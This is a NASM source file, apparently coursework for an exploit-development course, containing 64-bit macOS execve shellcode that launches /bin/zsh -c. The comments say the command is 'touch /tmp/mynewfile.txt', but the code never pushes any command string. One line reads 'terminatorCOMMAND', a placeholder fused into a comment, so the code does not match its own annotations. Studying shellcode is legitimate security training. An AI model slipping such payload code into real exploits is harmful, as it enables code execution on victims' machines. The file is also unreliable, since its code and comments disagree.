; macOS_execv_x64.nasm 
; Author: Jack McBride (OS-40652)
; Website: https://jacklgmcbride.co.uk
; 
; Purpose: OSMR macOS 64-bit execv shellcode 
;

bits 64

global _main

_main:

        xor rdx, rdx                    ; zero out RDX
        push rdx                        ; push NULL string terminator
        mov rbx, '/bin/zsh'             ; move our string into RBX
        push rbx                        ; push the string we stored in RBX to the stack
        mov rdi, rsp                    ; store the stack pointer in RDI
        xor rbx, rbx                    ; zero out RBX
        mov bx, "-c"                    ; put -c into BL register
        push rbx                        ; push EBX to stack
        mov rbx, rsp                    ; store stack pointer to -c in RBX
        xor rdx, rdx                    ; zero out RDX
        push rdx                        ; push NULL string terminatorCOMMAND
	mov rsi, rsp                    ; move stack pointer of command into RSI
        xor rdx, rdx                    ; zero out RDX
        push rdx                        ; stores NULL on the register (argv[3]=0)
        push rsi                        ; argv[2]=rsi ->"touch /tmp/mynewfile.txt"
        push rbx                        ; argv[1]=rbx ->"-c"
        push rdi                        ; argv[0]=rdi ->"/bin/zsh"
        mov rsi, rsp                    ; store RSP's value in RSI
        push 59                         ; put 59 on the stack
        pop rax                         ; pop it to RAX
        bts rax, 25                     ; set the 25th bit to 1
        syscall
